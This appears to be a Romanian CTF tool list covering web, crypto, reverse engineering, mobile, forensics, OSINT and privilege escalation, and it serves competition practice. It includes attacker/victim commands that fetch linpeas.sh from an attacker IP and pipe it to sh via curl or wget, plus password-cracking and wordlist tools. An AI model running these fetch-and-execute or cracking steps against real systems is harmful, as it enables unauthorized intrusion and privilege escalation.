# 🔧 Tools

Unelte și site-uri verificate pentru concursuri.

---
Aceasta lista nu este completa so to be continued...
In the meantime poti visita: 
* https://github.com/apsdehal/awesome-ctf
* https://book.hacktricks.wiki/en/index.html

Al doilea link este putin mai complicat asa ca first choice ii primul.
### COMMANDS
* **https://realpython.com/python-virtual-environments-a-primer/**
  ```
   Ca sa iti creezi virtual environment pt pip.
  ```
### 🌐 WEB

* **https://requestrepo.com**
  ```
  Webhook pe steroizi. 
  ```
* **https://webhook.site**
  ```
  Varianta mai simpla pentru prins request-uri HTTP.
  ```
* **Burp Suite Community**
  ```
  Tata lor. 
  ```

* **Wappalyzer (Extensie)**
  ```
  Iti zice instant ce  ruleaza pe site (PHP, Python, React etc).
  ```
* **https://github.com/swisskyrepo/PayloadsAllTheThings**
  ```
  Payload pt orice.
  ```

---

### 🔐 CRYPTO

* **https://gchq.github.io/CyberChef/**
  ```
  "Swiss Army Knife". Decodeaza orice (Base64, Hex, XOR, ROT13). Il tii mereu deschis.
  ```
* **https://crackstation.net/**
  ```
  Bagi hash-ul si iti da parola.
  ```
* **https://www.dcode.fr/**
  ```
  Are decodoare pentru toate cifrurile ciudate de care n-a auzit nimeni.
  ```


* **https://sagecell.sagemath.org/**
  ```python
  # Definire Corp finit (Mod p)
  F = GF(p) 
  
  # Operatii de baza
  F(a).sqrt()           #(Radacina patrata)
  F(a).is_square()     # Verifica daca exista radacina 
  inverse_mod(a, p)    # Invers modular (a^-1 mod p)
  
 
  discrete_log(F(target), F(base)) #logaritm discret
  
  # Factorizare & Primes
  is_prime(n)          
  factor(n)            # Descompunere in factori primi
  ```


### 🧠 REV & PWN

* **Ghidra**
  ```
  Decompilator free de la NSA. Bagi exe-ul si iti arata codul C. Baza la reverse.
  ```
* **Strings (Comanda Linux)**
  ```
  Dai "strings nume_fisier" si vezi tot textul din el. Primul pas mereu.
  ```
* **Pwntools (Python Lib)**
  ```
  Librarie de Python ca sa scrii exploit-uri si sa te conectezi la servere.
  ```

---

### 📱 MOBILE

* **JADX-GUI**
  ```
  Bagi APK-ul si vezi codul sursa in Java. Cel mai bun tool de inceput.
  ```
* **Apktool**
  ```
  Despachetezi APK-ul sa vezi resursele (imagini, xml-uri) si sa il modifici.
  ```
* **https://github.com/extremecoders-re/tcpdump-android-builds**
  ```
  Tcpdump pentru Android. Sa prinzi traficul de pe telefon.
  ```

---

### 🕵️ STEG & FORENSICS

* **https://www.aperisolve.com/**
  ```
  Baza la stegano. Urca poza si iti face toate analizele posibile automat.
  ```
* **https://georgeom.net/StegOnline/upload**
  ```
  Vezi bitii din imagine pe diferite canale de culoare.
  ```
* **Wireshark**
  ```
  Deschizi fisiere .pcap. Dai "Follow TCP Stream" sa vezi ce s-a vorbit in retea.
  ```
* **Binwalk**
  ```
  Extrage fisiere ascunse in alte fisiere (ex: un zip ascuns intr-un jpg).
  ```
* **Stegcracker**
  ```
  Mod de folosire: stegcracker filename /usr/share/wordlists/lista_dorita
  ```
* **[Uncompyle6](https://pypi.org/project/uncompyle6/)**
  ```
  Exact numele.
  ```

---

### 🔎 OSINT

* **Exiftool**
  ```
  Vezi metadata (locatie, ora, device, user) din poze sau documente.
  ```
* **Google Lens / Yandex Images**
  ```
  Reverse image search. Yandex e regele pe chestii din estul europei.
  ```
* **Wayback Machine**
  ```
  Vezi cum arata un site in trecut (poate au sters un flag sau o parola).
  ```
* **Sherlock**
  ```
  Script de python. Ii dai un username si il cauta pe toate retelele sociale.
  ```
* **Cupp**
  ```
  Script pentru a-ti genera parole in functie de raspunsurile la niste intrebari.
  python3 cupp/cupp.py -i
  ```


---



### 🚩 EXPLOIT & PRIVESC

* **SecLists**
  ```
  /usr/share/seclists
  Dictionare pentru orice: parole, useri, directoare web (fuzzing) si payload-uri. 
  ```
* **PEASS-ng (LinPEAS / WinPEAS)**
  ```bash
  # Pe atacator: python3 -m http.server 80
  # Pe victima: curl -L http://<IP>/linpeas.sh | sh
  
  Cel mai bun tool de Privilege Escalation. Iti arata cu rosu/galben vulnerabilitatile prin care poti lua Root.
  ```
####  Transfer & Executare (PEAS)

1. **Pe mașina ta (Atacator):**
   Mergi în folderul unde ai `linpeas.sh` și pornește un server web temporar:
   ```bash
   python3 -m http.server 80
   ```

2. **Pe mașina țintă (Victimă):**
   Rulezi comanda care descarcă și execută scriptul direct în memorie, fără să îl salveze:
   ```bash
   curl -L http://<IP_ATACATOR>/linpeas.sh | sh
   ```
   *(Dacă `curl` nu e instalat, poți folosi `wget -qO- http://<IP_ATACATOR>/linpeas.sh | sh`)*



